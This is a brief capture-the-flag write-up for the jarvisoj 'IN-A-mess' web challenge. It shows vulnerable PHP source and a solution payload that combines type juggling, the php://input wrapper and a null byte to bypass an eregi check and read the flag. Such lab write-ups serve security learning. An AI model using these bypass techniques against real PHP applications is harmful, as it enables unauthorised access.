# Challenge
```php
<?php
error_reporting(0);
echo "<!--index.phps-->";
if(!$_GET['id'])
{
	header('Location: index.php?id=1');
	exit();
}
$id=$_GET['id'];
$a=$_GET['a'];
$b=$_GET['b'];
if(stripos($a,'.'))
{
	echo 'Hahahahahaha';
	return ;
}
$data = @file_get_contents($a,'r');
if($data=="1112 is a nice lab!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
{
	require("flag.txt");
}
else
{
	print "work harder!harder!harder!";
}
?>
```

# Solution
payload:
```
?id=a&a=php://input&b=%0011111

POST:
1112 is a nice lab!
```

# Refference 
+ [jarvisoj : IN-A-mess](http://web.jarvisoj.com:32780/index.php?id=1)
+ [chybeta : IN-A-mess](https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/#IN-A-mess)